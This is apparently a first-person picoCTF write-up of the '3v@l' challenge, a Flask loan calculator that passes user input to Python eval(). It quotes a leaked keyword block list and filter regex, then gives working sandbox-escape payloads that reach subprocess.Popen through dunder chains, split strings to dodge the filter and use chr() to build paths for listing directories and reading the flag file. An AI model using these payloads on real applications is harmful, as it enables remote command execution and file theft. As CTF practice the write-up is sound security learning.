    Introduction

    Hi there! This was another fun one. Note: like Crack the Gate 2, I completed this multiple months ago, probably some time in March. It's been a minute—this writeup may or may not be a little jank. Don't say I didn't warn you, lol.

    The challenge description was short and immediately obvious about what was going on:

    "ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan."

    Challenge Name: 3v@l
    Platform: picoCTF 2026
    Difficulty: Medium
    Category: Web Exploitation

    RCE time. The word "eval" in a web app was basically a neon sign that says "please inject arbitrary code here." The real question wasn't whether that was exploitable, but rather how, given that someone had clearly tried to put up some defenses. It was only a matter of time.


    Gobuster and a Fun HTML Comment

    Ran a quick gobuster scan first out of habit:

    gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt

    I did find one interesting result: /console, returning a 400. Weird—made note of it and moved on. It wasn't reachable, so there probably wasn't much I could do with it, but might be worth remembering.

    Loading the app itself, I noticed that the page source came with a complimentary copy of the dev's to-do list:

    <!--
    TODO
    ------------
    Secure python_flask eval execution by
        1. blocking malicious keywords like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2. Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
-->

    Let me say that again: the developer had accidentally left their entire security plan in a conveniently-placed HTML comment. I now knew exactly which keywords were blocked and exactly which regex patterns were being applied. The word "implementing" in that comment also raised a pretty important question—were they even finished with this part yet?

    Oh, It's Just Python

    The app had a textarea whose contents were being POSTed to /evaluate, with a placeholder suggesting a loan formula like PRT*RATE*TIME(10000*23*12). I tried that and got back:

    Result: Error: name 'PRT' is not defined

    That error message was telling. The backend wasn't evaluating some custom formula language—that thing was running straight Python and sending the interpreter's error messages right back to us. I tried:

    print('gotcha?')

    Result: None. Python's print() statement always returns None. So this really is just raw Python eval(). Yay.


    Before I tried to break anything, I needed to understand what exactly the filters were actually doing. The TODO gave me a pretty good idea, so I started testing each piece one by one.

    Keywords

    Trying os returned:

    Error: Detected forbidden keyword 'os'.

    Ok, so keyword blocking was working. But the list they planned to block was pretty specific: os, eval, exec, bind, connect, python, socket, ls, cat, shell. They missed a spot—more on that in a moment.

    The Regex

    The regex looked like it was supposed to block hex values, unicode escapes, URL encoding, file extensions, slashes, and ... Testing each pattern directly in the input showed they were actually just being removed rather than outright rejected—the response came back as Error: Detected forbidden keyword ''. An empty string—the pattern was just being stripped out. Ok, interesting.

    What I found out was that there was one crucial thing missing from both the keyword list and the regex: underscores. If you're trying to secure a Python eval() and you forget to block underscores, you've kinda left the front door unlocked.

    Python's whole object model is accessible through dunder (double underscore) attributes: if underscores work, there's suddenly an entire class of payloads now available. I tried ''.__class__ and got back... absolutely nothing? But in Burp Suite, the raw response showed:

    Result: <class 'str'>

    The result was there, but the greater-than and less-than in the response were being interpreted as HTML tags by the browser, and then failing to render. Burp Suite saved me from missing that entirely—one more reason that Burp is simply awesome.


    Escaping the Python Sandbox with Subclasses

    With underscores working and the response visible in Burp, I ran the classic Python sandbox payload to get a list of my available subclasses:

    ''.__class__.__mro__[1].__subclasses__()

    The first part of that, ''.__class__.__mro__, references the inheritance tree for the str class; at index 1 of that tree is the object class. Then, the call to object's __subclasses__() lists every class that inherits from it. In other words, since the method was called on the object class, it lists out every class available for us to mess with—which in a Flask app running with subprocess support includes things like subprocess.Popen. I found it at index 356.

    Now I needed to figure out how to run a shell command. The obvious attempt:

    ''.__class__.__mro__[1].__subclasses__()[356]('ls', stdout=-1).communicate()[0]

    Blocked—ls is on the forbidden keyword list. Ok, suit yourself.

    ''.__class__.__mro__[1].__subclasses__()[356]('l' + 's', stdout=-1).communicate()[0]

    Blocked again, this time for cat. But I wasn't using cat... oh. communiCATe. Touché. The filter was case-insensitive, and it was just matching substrings. I had to find a way to split up the method name too.

    Eventually, after some intense googling, I figured out I could use getattr() to call the method by a split string instead of dot notation:

    (getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's'], stdout=-1), 'communica' + 'te'))()
    Result: b'app.py\nstatic\ntemplates\n'

    Success!

    Getting a Slash

    Now I needed to navigate the filesystem, but slashes were blocked by the regex. My first idea (for some reason) was to run ls -aF, which appends / to directory names in its output, and harvest the slash character from the resulting bytes:

    (getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's', '-aF'], stdout=-1), 'communica' + 'te'))()[0]
    b'./\n../\napp.py\nstatic/\ntemplates/\n'

    Index [1] of that byte string is the / character; now I had an expression that I could use to create slashes in order to navigate the filesystem. I tried building a command that used that harvested slash, but it turned into complete spaghetti that threw a syntax error. I still don't know why—all of the pieces of the command worked on their own with no error. Putting them together somehow broke the whole thing. Funnnnnnn.

    But then it hit me: chr() exists. Python already has a built-in function that converts an integer to a character. I didn't need to harvest anything from anywhere—I could've just done that from the very beginning.

    (getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's', chr(47)], stdout=-1), 'communica' + 'te'))()[0]
    Result: b'app\nbin\nboot\nchallenge\ndev\netc\nflag.txt\nhome\n...'

    Oh hey, flag.txt, just chilling in the root directory.

    Reading the Flag

    I used the same tricks: splitting cat, using chr(47) for the slash, chr(46) for the dot in .txt. The final payload was a little something like this:

    (getattr(''.__class__.__mro__[1].__subclasses__()[356](['ca' + 't', chr(47)+"flag"+chr(46)+"txt"], stdout=-1), 'communica' + 'te'))()[0]

    Flag. Woohoo


    This one took longer than it should have, mostly because the spaghetti slash-harvesting detour cost me a solid chunk of time. But the core technique was genuinely satisfying to work through, and it was exactly what TryHackMe had been teaching me to do over and over again.

    Key Takeaways

    • Forgetting to block underscores in a Python sandbox is one hell of a blunder. Python's dunder attribute chain is literally the textbook approach to escaping eval() sandboxes; if underscores aren't blocked, the sandbox isn't really a sandbox anymore.
    • chr() exists. Can't forget about it. Just because it was blocked for one box I'd done before didn't mean it would be blocked for all of them.
    • Burp Suite is king. Always check the raw response—that bit took me a while to figure out.
    • Don't let your payload get so messy that not even you understand it anymore. The nested slash-harvesting approach technically worked, but it was a maintenance nightmare—there was just too much going on. More complex isn't usually better.

    What I'd Do Differently

    I should have thought of chr() way earlier. The slash problem showed up immediately after I confirmed RCE, and I went down an hour-long rabbit hole building a nested payload that somehow grew a mind of its own—when the clean (and probably the intended) solution was right there in Python's standard library. Getting creative is good, but remembering the basics is still nonnegotiable.

    Maybe I'll remember next time.
